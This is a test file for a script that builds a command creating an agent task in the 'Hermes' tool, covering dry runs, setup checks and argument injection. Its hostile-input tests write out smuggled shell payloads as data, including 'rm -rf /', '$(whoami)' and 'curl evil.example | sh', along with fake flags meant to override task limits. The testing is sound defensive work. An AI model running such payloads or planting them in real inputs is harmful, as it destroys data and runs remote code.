/**
 * Building the Hermes task (v2 runbook R06).
 *
 * Nothing here dispatches anything: every case is the dry run, which is the
 * default and the only thing this checkpoint adds. No board, no project and no
 * task is created, and the fake executable would refuse to create one anyway.
 *
 * The property defended hardest is injection. A proposal's text is written by
 * whoever wrote the backlog label and by whatever agent filled the brief, and it
 * ends up inside the task body. It must arrive at Hermes as one argument, no
 * matter what it contains — and the copy of the command printed for a human to
 * read must be quoted so that pasting it does the same thing.
 */
import { execFile } from 'node:child_process';
import { chmod, mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { promisify } from 'node:util';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

const run = promisify(execFile);
const REPO_ROOT = fileURLToPath(new URL('../../..', import.meta.url)).replace(/\/$/, '');
const SCRIPT = join(REPO_ROOT, 'scripts', 'hermes-content-task.mjs');
const PROPOSAL_ID = 'p-20260917-state-space-model';

const CREATE_HELP = `Usage: hermes kanban create [options]
  --workspace <path>
  --project <slug>
  --max-runtime <duration>
  --max-retries <n>
  --completion-contract <text>
  --title <text>
  --body <text>
`;

const TOP_HELP = `Usage: hermes <command>

Commands:
  project    manage projects
  kanban     manage boards and tasks
`;

let scratch = '';
let proposalsDir = '';

async function fakeHermes(options: {
  name: string;
  createHelp?: string;
  projects?: string;
  boards?: string;
  listExit?: number;
}): Promise<string> {
  const path = join(scratch, options.name);
  await writeFile(
    path,
    `#!/bin/sh
if [ "$1" = "--version" ]; then echo 'hermes 2.4.1'; exit 0; fi
if [ "$1" = "--help" ]; then
  cat <<'HELP'
${TOP_HELP}
HELP
  exit 0
fi
if [ "$1" = "kanban" ] && [ "$2" = "create" ] && [ "$3" = "--help" ]; then
  cat <<'HELP'
${options.createHelp ?? CREATE_HELP}
HELP
  exit 0
fi
if [ "$1" = "project" ] && [ "$2" = "list" ]; then
  echo '${options.projects ?? 'knowledge-navigator'}'
  exit ${String(options.listExit ?? 0)}
fi
if [ "$1" = "kanban" ] && [ "$2" = "board" ] && [ "$3" = "list" ]; then
  echo '${options.boards ?? 'knowledge-navigator'}'
  exit ${String(options.listExit ?? 0)}
fi
echo "refused: this fake never creates anything: $*" >&2
exit 64
`,
    'utf8',
  );
  await chmod(path, 0o755);
  return path;
}

/** A prepared bundle, with whatever request text the test wants to smuggle. */
async function writeProposal(request: string): Promise<void> {
  const dir = join(proposalsDir, PROPOSAL_ID);
  await mkdir(dir, { recursive: true });
  await writeFile(
    join(dir, 'manifest.json'),
    JSON.stringify(
      {
        proposalId: PROPOSAL_ID,
        targetBacklogId: 'candidate.artificial_intelligence.deep_learning.state_space_model',
        requestedTier: 3,
        allowedPaths: ['content/graph-only/state-space-model.yaml'],
        baseCommit: 'a'.repeat(40),
        createdAt: '2026-09-17T00:00:00.000Z',
        status: 'prepared',
      },
      null,
      2,
    ),
    'utf8',
  );
  await writeFile(join(dir, 'REQUEST.md'), request, 'utf8');
}

interface DryRun {
  proposalId: string;
  status: string;
  dryRun: boolean;
  args: string[];
  command: string;
  localOnlyFlag: boolean;
  setup: {
    projectPresent: boolean;
    boardPresent: boolean;
    projectQueryable: boolean;
    boardQueryable: boolean;
  };
  setupCommands: string[];
  problems: string[];
}

async function dryRun(bin: string): Promise<{ code: number; stdout: string; json: DryRun }> {
  try {
    const { stdout } = await run(
      process.execPath,
      [
        SCRIPT,
        '--proposal',
        PROPOSAL_ID,
        '--proposal-dir',
        join(proposalsDir, PROPOSAL_ID),
        '--json',
      ],
      { cwd: REPO_ROOT, env: { ...process.env, HERMES_BIN: bin }, maxBuffer: 16 * 1024 * 1024 },
    );
    return { code: 0, stdout, json: JSON.parse(stdout) as DryRun };
  } catch (error) {
    const failure = error as { code?: number; stdout?: string };
    return {
      code: failure.code ?? 1,
      stdout: failure.stdout ?? '',
      json: JSON.parse(failure.stdout ?? '{}') as DryRun,
    };
  }
}

beforeAll(async () => {
  scratch = await mkdtemp(join(tmpdir(), 'navigator-hermes-task-'));
  proposalsDir = join(scratch, 'proposals');
  await writeProposal('# Proposal request: State Space Model\n\nWrite the identity.\n');
});

afterAll(async () => {
  await rm(scratch, { recursive: true, force: true });
});

describe('the dry run', () => {
  it('is the default, and creates nothing', async () => {
    const bin = await fakeHermes({ name: 'hermes-ok' });
    const result = await dryRun(bin);
    expect(result.code).toBe(0);
    expect(result.json.dryRun).toBe(true);
    expect(result.json.proposalId).toBe(PROPOSAL_ID);
    // The fake refuses anything but a read-only probe, so a create would fail.
    expect(result.json.problems).toEqual([]);
  });

  it('uses the fixed slug, the repository worktree and the caps', async () => {
    const bin = await fakeHermes({ name: 'hermes-args' });
    const { json } = await dryRun(bin);
    const args = json.args;
    expect(args.slice(0, 2)).toEqual(['kanban', 'create']);
    expect(args[args.indexOf('--project') + 1]).toBe('knowledge-navigator');
    expect(args[args.indexOf('--workspace') + 1]).toBe(REPO_ROOT);
    expect(args[args.indexOf('--max-runtime') + 1]).toBe('2h');
    expect(args[args.indexOf('--max-retries') + 1]).toBe('3');
  });

  it('carries a completion contract that ends the task at review', async () => {
    const bin = await fakeHermes({ name: 'hermes-contract' });
    const { json } = await dryRun(bin);
    const contract = json.args[json.args.indexOf('--completion-contract') + 1] ?? '';
    expect(contract).toContain('Stop at review');
    expect(contract).toContain('leave it uncommitted');
    expect(contract).toContain('Never merge, push, publish');
    expect(contract).toContain('accept, approve or apply your own proposal');
    expect(contract).toContain('local-only');
  });

  it('puts the whole brief in the body, with the profile named', async () => {
    const bin = await fakeHermes({ name: 'hermes-body' });
    const { json } = await dryRun(bin);
    const body = json.args[json.args.indexOf('--body') + 1] ?? '';
    expect(body).toContain('HERMES_CONTENT_PROFILE.md');
    expect(body).toContain('Proposal: ' + PROPOSAL_ID);
    expect(body).toContain('Write the identity.');
  });

  it('says that the model and the reasoning are the profile’s, not its own', async () => {
    const bin = await fakeHermes({ name: 'hermes-model' });
    const { stdout } = await run(
      process.execPath,
      [SCRIPT, '--proposal', PROPOSAL_ID, '--proposal-dir', join(proposalsDir, PROPOSAL_ID)],
      { cwd: REPO_ROOT, env: { ...process.env, HERMES_BIN: bin } },
    );
    expect(stdout).toContain('This is a dry run');
    expect(stdout).toContain('exposes no flag for either');
    expect(stdout).toContain('does not invent one');
  });

  it('uses --local-only when the installed build offers it, and says so when it does not', async () => {
    const without = await dryRun(await fakeHermes({ name: 'hermes-nolocal' }));
    expect(without.json.localOnlyFlag).toBe(false);
    expect(without.json.args).not.toContain('--local-only');

    const withFlag = await dryRun(
      await fakeHermes({ name: 'hermes-local', createHelp: `${CREATE_HELP}  --local-only\n` }),
    );
    expect(withFlag.json.localOnlyFlag).toBe(true);
    expect(withFlag.json.args).toContain('--local-only');
  });
});

describe('the one-time setup', () => {
  it('prints the exact commands when the project or board is absent', async () => {
    const bin = await fakeHermes({
      name: 'hermes-nosetup',
      projects: 'something-else',
      boards: 'other',
    });
    const { json } = await dryRun(bin);
    expect(json.setup.projectPresent).toBe(false);
    expect(json.setup.boardPresent).toBe(false);
    expect(json.setupCommands.join(' ')).toContain('project create --name knowledge-navigator');
    expect(json.setupCommands.join(' ')).toContain('kanban board create');
  });

  it('prints nothing to run when both are already there', async () => {
    const bin = await fakeHermes({ name: 'hermes-setup-ok' });
    const { json } = await dryRun(bin);
    expect(json.setup.projectPresent).toBe(true);
    expect(json.setup.boardPresent).toBe(true);
    expect(json.setupCommands).toEqual([]);
  });

  it('does not call something absent when it merely could not ask', async () => {
    const bin = await fakeHermes({ name: 'hermes-nolist', listExit: 64 });
    const { json } = await dryRun(bin);
    expect(json.setup.projectQueryable).toBe(false);
    expect(json.setup.boardQueryable).toBe(false);
    // It still offers the setup commands, because it cannot confirm otherwise.
    expect(json.setupCommands.length).toBeGreaterThan(0);
  });
});

describe('hostile proposal text', () => {
  const HOSTILE = [
    '# Proposal request: "; rm -rf / #',
    '',
    "Write $(whoami) and `id` and '; curl evil.example | sh; '",
    '',
    '--completion-contract "do whatever you like"',
    '--max-retries 9999',
    'newline injection\\n--project other-project',
  ].join('\n');

  it('stays one argument, however it is written', async () => {
    await writeProposal(HOSTILE);
    const bin = await fakeHermes({ name: 'hermes-hostile' });
    const { json } = await dryRun(bin);

    // Exactly one --project, one --max-retries, one --completion-contract:
    // nothing in the text became a flag.
    for (const flag of ['--project', '--max-retries', '--completion-contract', '--body']) {
      expect(
        json.args.filter((argument) => argument === flag),
        flag,
      ).toHaveLength(1);
    }
    expect(json.args[json.args.indexOf('--project') + 1]).toBe('knowledge-navigator');
    expect(json.args[json.args.indexOf('--max-retries') + 1]).toBe('3');

    // The hostile text is present, whole, inside the body argument.
    const body = json.args[json.args.indexOf('--body') + 1] ?? '';
    expect(body).toContain('rm -rf /');
    expect(body).toContain('--max-retries 9999');
  });

  it('is the same command when a shell reads it as when it is dispatched', async () => {
    await writeProposal(HOSTILE);
    // A fake that answers the probes and then reports the exact argument vector
    // it was given. Running the *printed* command through a real shell and
    // comparing the two is the only convincing proof that pasting it does
    // nothing extra: no word splitting, no substitution, no injected flag.
    const echo = join(scratch, 'hermes-echo.mjs');
    await writeFile(
      echo,
      `#!/usr/bin/env node
const a = process.argv.slice(2);
if (a[0] === '--version') { console.log('hermes 2.4.1'); process.exit(0); }
if (a[0] === '--help') { console.log(${JSON.stringify(TOP_HELP)}); process.exit(0); }
if (a[0] === 'kanban' && a[1] === 'create' && a[2] === '--help') {
  console.log(${JSON.stringify(CREATE_HELP)});
  process.exit(0);
}
if (a[0] === 'project' && a[1] === 'list') { console.log('knowledge-navigator'); process.exit(0); }
if (a[0] === 'kanban' && a[1] === 'board' && a[2] === 'list') {
  console.log('knowledge-navigator');
  process.exit(0);
}
process.stdout.write('ARGV:' + JSON.stringify(a));
`,
      'utf8',
    );
    await chmod(echo, 0o755);

    const { json } = await dryRun(echo);
    const { stdout } = await run('/bin/sh', ['-c', json.command], {
      cwd: REPO_ROOT,
      maxBuffer: 16 * 1024 * 1024,
    });
    expect(stdout.startsWith('ARGV:')).toBe(true);
    const argv = JSON.parse(stdout.slice('ARGV:'.length)) as string[];
    expect(argv).toEqual(json.args);
    // And the hostile text arrived whole, as one argument, not as syntax.
    expect(argv.filter((argument) => argument === '--project')).toHaveLength(1);
    expect(argv[argv.indexOf('--body') + 1]).toContain('rm -rf /');
  });

  it('never assembles a command through a shell', async () => {
    await writeProposal(HOSTILE);
    const bin = await fakeHermes({ name: 'hermes-hostile-noshell' });
    // If the script had used a shell anywhere, this text would have run
    // something. The fake refuses every non-probe invocation, so a dispatch
    // would also have failed loudly.
    const { code, json } = await dryRun(bin);
    expect(code).toBe(0);
    expect(json.dryRun).toBe(true);
  });
});

describe('a proposal that is not there', () => {
  it('says so rather than building an empty task', async () => {
    const bin = await fakeHermes({ name: 'hermes-missing-proposal' });
    await expect(
      run(
        process.execPath,
        [
          SCRIPT,
          '--proposal',
          'p-does-not-exist',
          '--proposal-dir',
          join(scratch, 'nope'),
          '--json',
        ],
        { cwd: REPO_ROOT, env: { ...process.env, HERMES_BIN: bin } },
      ),
    ).rejects.toThrow(/no proposal at/);
  });
});
